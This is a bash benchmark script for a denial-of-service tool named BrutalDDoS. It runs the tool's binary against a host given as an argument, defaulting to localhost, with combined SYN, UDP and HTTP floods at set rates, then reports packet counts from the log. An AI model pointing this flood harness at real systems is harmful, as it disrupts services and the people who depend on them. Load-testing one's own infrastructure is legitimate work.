#!/bin/bash

# BrutalDDoS Benchmark Script
# Runs a controlled burst attack to measure resource usage and stability.

set -e

PROJECT_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
BINARY="$PROJECT_ROOT/brutaldDos"
TARGET="${1:-127.0.0.1}" # Default to localhost if not specified
PORT="${2:-80}"
DURATION="${3:-10}"      # Duration in seconds
THREADS="${4:-8}"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Check binary exists
if [ ! -f "$BINARY" ]; then
    echo -e "${RED}[ERROR]${NC} Binary '$BINARY' not found. Run ./scripts/build.sh first."
    exit 1
fi

echo -e "${BLUE}[Benchmark]${NC} Target: $TARGET:$PORT"
echo -e "${BLUE}[Benchmark]${NC} Duration: ${DURATION}s | Threads: $THREADS"
echo -e "${BLUE}[Benchmark]${NC} Starting attack..."
echo "----------------------------------------"

# Record start time
START_TIME=$(date +%s%N)

# Run the binary in background, redirecting output to a log file
# We use 'nice' to slightly prioritize the benchmark if needed, 
# but usually we want to see max performance so no nice limit.
$BINARY \
    -t "$TARGET" \
    -p "$PORT" \
    -m all \
    -c "$THREADS" \
    --syn-rate 50000 \
    --udp-bandwidth 50mbps \
    --http-rps 1000 \
    --payload-size 1kb \
    --verbose > "$PROJECT_ROOT/benchmark_log.txt" 2>&1 &

PID=$!

# Wait for duration
sleep "$DURATION"

# Stop the process gracefully
kill -TERM "$PID" 2>/dev/null || true
wait "$PID" 2>/dev/null || true

END_TIME=$(date +%s%N)

# Calculate duration in milliseconds
ELAPSED_MS=$(( (END_TIME - START_TIME) / 1000000 ))

echo "----------------------------------------"
echo -e "${GREEN}[Benchmark Complete]${NC}"
echo -e "Total Runtime: ${ELAPSED_MS} ms"
echo -e "Log saved to: $PROJECT_ROOT/benchmark_log.txt"

# Analyze log for basic stats if available
if grep -q "Packets Sent" "$PROJECT_ROOT/benchmark_log.txt"; then
    PACKETS=$(grep "Packets Sent" "$PROJECT_ROOT/benchmark_log.txt" | tail -n 1 | awk '{print $NF}')
    echo -e "${YELLOW}[Stats]${NC} Total Packets Sent: $PACKETS"
    
    # Estimate PPS (Packets Per Second)
    if [ "$ELAPSED_MS" -gt 0 ]; then
        PPS=$((PACKETS * 1000 / ELAPSED_MS))
        echo -e "${YELLOW}[Stats]${NC} Avg PPS: $PPS"
    fi
else
    echo -e "${YELLOW}[Info]${NC} Standard stats not found in log. Check manual logs for details."
fi

# Cleanup log file if too large (>10MB), optional
if [ -f "$PROJECT_ROOT/benchmark_log.txt" ]; then
    SIZE=$(du -b "$PROJECT_ROOT/benchmark_log.txt" | cut -f1)
    if [ "$SIZE" -gt 10485760 ]; then
        echo -e "${YELLOW}[Warning]${NC} Log file is large ($SIZE bytes). Consider archiving."
    fi
fi
